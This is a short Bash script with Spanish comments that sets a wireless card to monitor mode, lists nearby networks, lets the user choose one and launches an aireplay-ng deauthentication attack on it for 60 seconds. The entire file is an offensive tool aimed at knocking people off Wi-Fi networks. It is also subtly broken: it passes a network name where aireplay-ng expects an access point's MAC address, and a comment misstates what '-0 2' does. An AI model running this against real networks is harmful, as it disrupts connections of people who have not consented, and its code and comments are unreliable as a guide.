#!/bin/bash

# Colores
RED="\033[1;31m"
GREEN="\033[1;32m"  
YELLOW="\033[1;33m"
WHITE="\033[1;37m"

# Interfaz (se puede cambiar según la que se use)  
IFACE="wlan0"

# Pone la interfaz en modo monitor
enable_monitor() {

  airmon-ng check kill
  ip link set $IFACE down
  iw dev $IFACE set type monitor
  ip link set $IFACE up

}

# Regresa la interfaz a modo normal  
disable_monitor() {

  ip link set $IFACE down
  iw dev $IFACE set type managed
  ip link set $IFACE up
  service network-manager restart

}

# Realiza el ataque deauth
attack() {

  echo -e "\n${RED}[!] ${WHITE}Iniciando ataque Deauth...${WHITE}\n"

  # -0 2 significa paquetes de deauth indefinidamente
  timeout 60s aireplay-ng -0 2 -a $1 $IFACE

  echo -e "\n${GREEN}[+] ${WHITE}Ataque Deauth finalizado!${WHITE}\n"

}

# Obtiene un SSID de red a atacar
get_target() {

  networks=($(sudo iwlist $IFACE scan | grep ESSID | awk '{print $2}'))  

  echo -e "${WHITE}Redes disponibles:\n"

  for ((i=0; i<${#networks[@]}; i++)); do
    echo -e "${RED}$i) ${networks[$i]}"
  done

  read -p "Ingresa el índice de la red a atacar: " target

}

# Flujo principal
enable_monitor

get_target
SSID=${networks[$target]}

attack $SSID  

disable_monitor
